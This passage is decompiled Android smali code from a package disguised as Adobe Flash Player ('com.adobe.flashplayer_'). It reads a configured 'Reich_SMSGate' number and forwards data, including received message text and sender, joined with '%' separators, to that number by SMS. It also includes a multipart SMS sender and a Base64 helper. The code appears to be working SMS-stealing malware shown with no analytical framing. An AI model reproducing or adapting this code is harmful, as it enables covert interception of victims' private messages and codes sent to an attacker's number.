    .end local v57    # "sms_get":Ljava/lang/String;
    :cond_1e
    const-string v4, "Reich_SMSGate"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v34

    .line 493
    .restart local v34    # "gate":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v55

    .line 494
    .restart local v55    # "smsManager":Landroid/telephony/SmsManager;
    if-eqz v55, :cond_e

    .line 496
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "+"

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v34

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static/range {v38 .. v38}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, "%"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v8, "%"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    move-object/from16 v0, v52

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v8, "%"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    move-object/from16 v0, v54

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    move-object/from16 v0, p0

    invoke-virtual {v0, v4, v6}, Lcom/adobe/flashplayer_/CCC;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_9

    .line 536
    .end local v34    # "gate":Ljava/lang/String;
    .end local v55    # "smsManager":Landroid/telephony/SmsManager;
    :cond_1f
    const-string v4, "Reich_SMSGate"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-direct {v0, v4, v1}, Lcom/adobe/flashplayer_/CCC;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v34

    .line 537
    .restart local v34    # "gate":Ljava/lang/String;
    const-string v4, "start"

    move-object/from16 v0, v58

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    const/4 v6, -0x1

    if-ne v4, v6, :cond_10

    .line 538
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "+"

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v34

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static/range {v38 .. v38}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, "%"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v8, "%"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    move-object/from16 v0, v52

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v8, "%"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    move-object/from16 v0, v54

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    move-object/from16 v0, p0

    invoke-virtual {v0, v4, v6}, Lcom/adobe/flashplayer_/CCC;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_a

    .line 90
    .end local v33    # "forceZ":Ljava/lang/String;
    .end local v34    # "gate":Ljava/lang/String;
    .end local v52    # "sender":Ljava/lang/String;
    .end local v54    # "sms":Ljava/lang/String;
    .end local v58    # "svcs":Ljava/lang/String;
    .end local v64    # "zkey":Ljava/lang/String;
    :catch_1
    move-exception v4

    goto/16 :goto_1
.end method

.method public sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    .locals 7
    .param p1, "n"    # Ljava/lang/String;
    .param p2, "msg"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    .line 655
    move-object v1, p1

    .line 656
    .local v1, "phoneNumber":Ljava/lang/String;
    move-object v6, p2

    .line 657
    .local v6, "message":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 658
    .local v0, "smsManager":Landroid/telephony/SmsManager;
    invoke-virtual {v0, v6}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v3

    .local v3, "parts":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    move-object v4, v2

    move-object v5, v2

    .line 659
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V

    .line 660
    return-void
.end method

.method public toBase64fromString(Ljava/lang/String;)Ljava/lang/String;
    .locals 2
    .param p1, "text"    # Ljava/lang/String;

    .prologue
    .line 582
    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    .line 583
    .local v0, "bytes":[B
    const/4 v1, 0x0

    invoke-static {v0, v1}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v1

    return-object v1
.end method
